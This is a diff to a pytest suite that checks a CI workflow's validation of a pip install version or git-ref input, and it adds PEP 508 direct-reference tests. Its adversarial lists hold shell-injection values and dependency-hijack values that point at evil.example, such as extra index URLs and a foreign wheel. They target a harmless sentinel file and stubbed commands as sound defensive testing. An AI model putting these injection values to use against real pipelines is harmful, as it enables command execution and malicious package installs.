@@ -5,12 +5,16 @@ The step's ``run:`` script is read from the workflow file and executed verbatim 
 ``pip`` and ``phantom`` replaced by stubs that only record their arguments. Nothing is
 installed and nothing touches the network.
 
-* Compatibility: each accepted form composes exactly the install target the workflow
-  produced before validation was added, with and without the AI extra.
+* Compatibility: each accepted form composes exactly its expected install target, with
+  and without the AI extra. Version specifiers and exact versions compose the target the
+  workflow has always produced. Git refs compose a PEP 508 direct reference,
+  ``phantom-docs[ai] @ git+<url>@<ref>``, parsed here to show the extra sits on the name
+  and the ref is the whole revision.
 * Adversarial: every other value is rejected by the validator itself (exit 1 plus its
   ``::error`` annotation) before ``pip`` runs. Payloads that try to run a command
   target a sentinel file, and a positive control shows the same payloads do execute
-  when rendered into script text the way the old interpolation did.
+  when rendered into script text the way the old interpolation did. With validation
+  bypassed, the composed target still reaches ``pip`` as one argument and nothing runs.
 * Anti-inertness: ``test_bypassed_rejection_is_detected`` shows the harness notices a
   validator that reports a bad value but lets the step continue.
 
@@ -28,8 +32,10 @@ from dataclasses import dataclass
 from functools import cache
 from pathlib import Path
 from typing import Any
+from urllib.parse import urlsplit
 
 import pytest
+from packaging.requirements import InvalidRequirement, Requirement
 from ruamel.yaml import YAML
 
 REPO_ROOT = Path(__file__).resolve().parents[2]
@@ -135,6 +141,18 @@ def _assert_rejected(run: InstallRun) -> None:
     assert run.phantom is None
 
 
+def _bypassed_script() -> str:
+    """The shipped script with ``reject`` still reporting but no longer stopping the step."""
+    script = _install_step()["run"]
+    assert script.count("exit 1") == 1, "expected exactly one exit, inside reject()"
+    return script.replace("exit 1", "true")
+
+
+def _pip_revision(url: str) -> str:
+    """The revision pip checks out for a VCS URL: whatever follows the path's last ``@``."""
+    return urlsplit(url).path.rsplit("@", 1)[1]
+
+
 # ── Structure: the value reaches the shell only through step env ──
 
 
@@ -207,11 +225,12 @@ def test_caller_derived_values_are_always_double_quoted() -> None:
     assert unquoted == []
 
 
-# ── Compatibility: accepted forms compose the same install target as before ──
+# ── Compatibility: accepted forms compose their exact install target ──
 
-# Git-ref targets append the extra after the ref exactly as the workflow always has.
-# pip parses "@main[ai]" as the revision "main[ai]", so the extra is not applied on
-# that path; the existing composition is preserved here, not changed.
+# Specifier and exact-version targets are unchanged from before validation was added.
+# Git-ref targets are PEP 508 direct references with the extra on the name. They used
+# to append the extra after the ref ("git+<url>@main[ai]"), which pip parses as the
+# nonexistent revision "main[ai]" with no extra, so that install could never succeed.
 COMPATIBLE = [
     # Forms evidenced in this repository (workflow default, history, docs, refs).
     pytest.param(
@@ -226,23 +245,36 @@ COMPATIBLE = [
     pytest.param("==0.4.*", "phantom-docs==0.4.*", "phantom-docs[ai]==0.4.*", id="minor-wildcard"),
     pytest.param("0.2.0", "phantom-docs==0.2.0", "phantom-docs[ai]==0.2.0", id="exact-old-default"),
     pytest.param("0.4.0", "phantom-docs==0.4.0", "phantom-docs[ai]==0.4.0", id="exact-current"),
-    pytest.param("main", f"{GIT}main", f"{GIT}main[ai]", id="ref-main"),
     pytest.param(
-        "feature-branch", f"{GIT}feature-branch", f"{GIT}feature-branch[ai]", id="ref-hyphenated"
+        "main",
+        "phantom-docs @ git+https://github.com/wbuscombe/phantom.git@main",
+        "phantom-docs[ai] @ git+https://github.com/wbuscombe/phantom.git@main",
+        id="ref-main",
+    ),
+    pytest.param(
+        "feature-branch",
+        "phantom-docs @ git+https://github.com/wbuscombe/phantom.git@feature-branch",
+        "phantom-docs[ai] @ git+https://github.com/wbuscombe/phantom.git@feature-branch",
+        id="ref-hyphenated",
     ),
     pytest.param(
         "pr-004/phantom-contract-freeze",
-        f"{GIT}pr-004/phantom-contract-freeze",
-        f"{GIT}pr-004/phantom-contract-freeze[ai]",
+        "phantom-docs @ git+https://github.com/wbuscombe/phantom.git@pr-004/phantom-contract-freeze",
+        "phantom-docs[ai] @ git+https://github.com/wbuscombe/phantom.git@pr-004/phantom-contract-freeze",
         id="ref-slashed-branch",
     ),
     pytest.param(
         "fix/action-pins-node24",
-        f"{GIT}fix/action-pins-node24",
-        f"{GIT}fix/action-pins-node24[ai]",
+        "phantom-docs @ git+https://github.com/wbuscombe/phantom.git@fix/action-pins-node24",
+        "phantom-docs[ai] @ git+https://github.com/wbuscombe/phantom.git@fix/action-pins-node24",
         id="ref-fix-branch",
     ),
-    pytest.param("v0.4.0", f"{GIT}v0.4.0", f"{GIT}v0.4.0[ai]", id="ref-release-tag"),
+    pytest.param(
+        "v0.4.0",
+        "phantom-docs @ git+https://github.com/wbuscombe/phantom.git@v0.4.0",
+        "phantom-docs[ai] @ git+https://github.com/wbuscombe/phantom.git@v0.4.0",
+        id="ref-release-tag",
+    ),
     # Other PEP 440 operators within the documented "version constraint" category.
     pytest.param(
         "~=0.4.0", "phantom-docs~=0.4.0", "phantom-docs[ai]~=0.4.0", id="grammar-compatible"
@@ -277,13 +309,63 @@ def test_accepted_form_installs_the_expected_target(
     assert run.phantom == ["--version"]
 
 
+# The table rows above, split by the category the validator assigns their value.
+REF_FORMS = [param for param in COMPATIBLE if str(param.id).startswith("ref-")]
+SPECIFIER_FORMS = [param for param in COMPATIBLE if param not in REF_FORMS]
+
+
+def test_every_category_has_accepted_forms() -> None:
+    assert len(REF_FORMS) == 5
+    assert len(SPECIFIER_FORMS) == len(COMPATIBLE) - 5 > 0
+
+
+@pytest.mark.parametrize("ai", [False, True])
+@pytest.mark.parametrize(("value", "target", "ai_target"), REF_FORMS)
+def test_git_ref_target_is_a_pep508_direct_reference(
+    value: str, target: str, ai_target: str, ai: bool
+) -> None:
+    """The extra is on the name, and the ref is the entire revision pip checks out."""
+    requirement = Requirement(ai_target if ai else target)
+    assert requirement.name == "phantom-docs"
+    assert requirement.extras == ({"ai"} if ai else set())
+    assert requirement.url == f"{GIT}{value}"
+    assert _pip_revision(requirement.url) == value
+    assert str(requirement.specifier) == ""
+    assert requirement.marker is None
+
+
+@pytest.mark.parametrize("ai", [False, True])
+@pytest.mark.parametrize(("value", "target", "ai_target"), SPECIFIER_FORMS)
+def test_specifier_target_is_a_named_requirement(
+    value: str, target: str, ai_target: str, ai: bool
+) -> None:
+    requirement = Requirement(ai_target if ai else target)
+    assert requirement.name == "phantom-docs"
+    assert requirement.extras == ({"ai"} if ai else set())
+    assert requirement.url is None
+    assert requirement.marker is None
+
+
+def test_extra_appended_after_the_ref_lands_in_the_revision() -> None:
+    """Positive control: the two checks above can see the defect this form fixed.
+
+    The workflow used to compose ``git+<url>@main[ai]``. That is not a named
+    requirement, so nothing carries the extra, and pip would check out the
+    nonexistent revision ``main[ai]``.
+    """
+    old = f"{GIT}main[ai]"
+    with pytest.raises(InvalidRequirement):
+        Requirement(old)
+    assert _pip_revision(old) == "main[ai]"
+
+
 @pytest.mark.parametrize("locale", LOCALES)
 @pytest.mark.parametrize(
     ("value", "target"),
     [
         (">=0.4,<0.5", "phantom-docs>=0.4,<0.5"),
         ("0.2.0", "phantom-docs==0.2.0"),
-        ("pr-004/phantom-contract-freeze", f"{GIT}pr-004/phantom-contract-freeze"),
+        ("pr-004/phantom-contract-freeze", f"phantom-docs @ {GIT}pr-004/phantom-contract-freeze"),
     ],
 )
 def test_accepted_forms_do_not_depend_on_locale(
@@ -310,10 +392,10 @@ def test_declared_default_is_accepted(tmp_path: Path) -> None:
     [
         pytest.param("0.2.0", "phantom-docs==0.2.0", id="N.N.N-is-exact-not-ref"),
         pytest.param("==0.2.0", "phantom-docs==0.2.0", id="operator-means-specifier"),
-        # Boundary cases, not documented forms: routed exactly as before this change.
-        pytest.param("0.2", f"{GIT}0.2", id="N.N-is-ref"),
-        pytest.param("v0.2.0", f"{GIT}v0.2.0", id="v-prefix-is-ref"),
-        pytest.param("0a2a0", f"{GIT}0a2a0", id="version-dot-is-literal"),
+        # Boundary cases, not documented forms: routed to the same category as always.
+        pytest.param("0.2", f"phantom-docs @ {GIT}0.2", id="N.N-is-ref"),
+        pytest.param("v0.2.0", f"phantom-docs @ {GIT}v0.2.0", id="v-prefix-is-ref"),
+        pytest.param("0a2a0", f"phantom-docs @ {GIT}0a2a0", id="version-dot-is-literal"),
     ],
 )
 def test_category_precedence_is_fixed(tmp_path: Path, value: str, target: str) -> None:
@@ -347,6 +429,10 @@ ARMED = [
     pytest.param(f'main"&&touch {SENTINEL}&&"', id="dquote-breakout-and"),
     pytest.param(f'"\ntouch {SENTINEL}\n"', id="dquote-newline-breakout"),
     pytest.param(f'\\\\";touch {SENTINEL};#', id="backslash-escape-breakout"),
+    # Aimed at the PEP 508 target's space and " @ " separator.
+    pytest.param(f"main @ $(touch {SENTINEL})", id="pep508-subst-after-separator"),
+    pytest.param(f"main[ai] @ `touch {SENTINEL}`", id="pep508-backtick-after-separator"),
+    pytest.param(f"$(touch {SENTINEL}) @ git+https://evil.example/x.git", id="pep508-subst-name"),
 ]
 
 UNSAFE = [
@@ -452,6 +538,37 @@ UNSAFE = [
     pytest.param(f"main && touch {SENTINEL}", id="ref-and"),
     pytest.param(f"main>{SENTINEL}", id="ref-redirect"),
     pytest.param("main --extra-index-url https://evil.example/simple", id="ref-option"),
+    # PEP 508 direct reference: in "phantom-docs[ai] @ git+<url>@<ref>" the space, the
+    # "@" separators and the extras brackets must only ever come from the workflow.
+    pytest.param("main @ git+https://evil.example/x.git", id="pep508-second-url"),
+    pytest.param("main@git+https://evil.example/x.git", id="pep508-vcs-url-override"),
+    pytest.param("@ git+https://evil.example/x.git", id="pep508-leading-separator"),
+    pytest.param("main @", id="pep508-dangling-separator"),
+    pytest.param("@main", id="pep508-at-prefix"),
+    pytest.param("main@", id="pep508-at-suffix"),
+    pytest.param("@", id="pep508-at-alone"),
+    pytest.param("phantom-docs @ git+https://evil.example/x.git", id="pep508-whole-reference"),
+    pytest.param(f"phantom-docs[ai] @ {GIT}main", id="pep508-own-target"),
+    pytest.param("evil @ https://evil.example/evil-1.0-py3-none-any.whl", id="pep508-other-dist"),
+    pytest.param("main ; python_version>'0'", id="pep508-marker"),
+    pytest.param("main;python_version>'0'", id="pep508-marker-no-space"),
+    pytest.param("main\t@\tgit+https://evil.example/x.git", id="pep508-tab-separator"),
+    pytest.param("main\n--index-url=https://evil.example/simple", id="pep508-newline-option"),
+    pytest.param("main -e git+https://evil.example/x.git", id="pep508-editable-option"),
+    pytest.param("main evil-package", id="pep508-second-requirement"),
+    # Extras come only from the ai-* flags, and only on the name, in either category.
+    pytest.param("main]", id="extra-rbracket-ref"),
+    pytest.param("[main", id="extra-lbracket-ref"),
+    pytest.param("[ai]", id="extra-alone"),
+    pytest.param("[ai]main", id="extra-before-ref"),
+    pytest.param("main[dev]", id="extra-other-ref"),
+    pytest.param("[ai] @ git+https://evil.example/x.git", id="extra-with-separator"),
+    pytest.param(">=0.4[ai]", id="extra-after-specifier"),
+    pytest.param("phantom-docs[ai]>=0.4", id="extra-named-specifier"),
+    pytest.param("0.2.0[ai]", id="extra-after-exact"),
+    pytest.param("[ai]0.2.0", id="extra-before-exact"),
+    pytest.param(">=0.4,<0.5 @ git+https://evil.example/x.git", id="specifier-with-separator"),
+    pytest.param("0.2.0 @ git+https://evil.example/x.git", id="exact-with-separator"),
 ]
 
 METACHARACTERS = {
@@ -537,17 +654,46 @@ def test_armed_payload_executes_under_old_interpolation(tmp_path: Path, value: s
     assert sentinel.exists()
 
 
-def test_bypassed_rejection_is_detected(tmp_path: Path) -> None:
+@pytest.mark.parametrize("ai", [None, "AI_AUTO"])
+@pytest.mark.parametrize("value", ARMED)
+def test_composed_target_stays_one_argument_without_validation(
+    tmp_path: Path, value: str, ai: str | None
+) -> None:
+    """Quoting alone keeps a payload inert inside the composed target.
+
+    With ``reject`` no longer stopping the step, every armed payload is composed into
+    a target, including the PEP 508 form with its space and ``@`` separator. It must
+    still reach ``pip`` as the one argument after ``install``, and nothing may run.
+    """
+    sentinel = tmp_path / "sentinel"
+    armed = _arm(value, sentinel)
+    run = _run(tmp_path, armed, ai=ai, script=_bypassed_script())
+    assert run.pip is not None, run.output
+    assert len(run.pip) == 2, run.pip
+    assert run.pip[0] == "install"
+    assert armed in run.pip[1]
+    assert not sentinel.exists(), "a payload executed"
+
+
+@pytest.mark.parametrize(
+    ("value", "target"),
+    [
+        pytest.param("main;touch x", f"phantom-docs @ {GIT}main;touch x", id="ref-semicolon"),
+        pytest.param(
+            "main @ git+https://evil.example/x.git",
+            f"phantom-docs @ {GIT}main @ git+https://evil.example/x.git",
+            id="pep508-second-url",
+        ),
+    ],
+)
+def test_bypassed_rejection_is_detected(tmp_path: Path, value: str, target: str) -> None:
     """Anti-inertness: a validator that reports but does not stop the step is caught.
 
     Mutates the shipped script so ``reject`` no longer exits, then shows an unsafe
     value reaches the pip stub and fails ``_assert_rejected``. The adversarial tests
     above therefore cannot pass against a gate that does not actually stop install.
     """
-    script = _install_step()["run"]
-    assert script.count("exit 1") == 1, "expected exactly one exit, inside reject()"
-    value = "main;touch x"
-    run = _run(tmp_path, value, script=script.replace("exit 1", "true"))
-    assert run.pip == ["install", f"{GIT}{value}"]
+    run = _run(tmp_path, value, script=_bypassed_script())
+    assert run.pip == ["install", target]
     with pytest.raises(AssertionError):
         _assert_rejected(run)
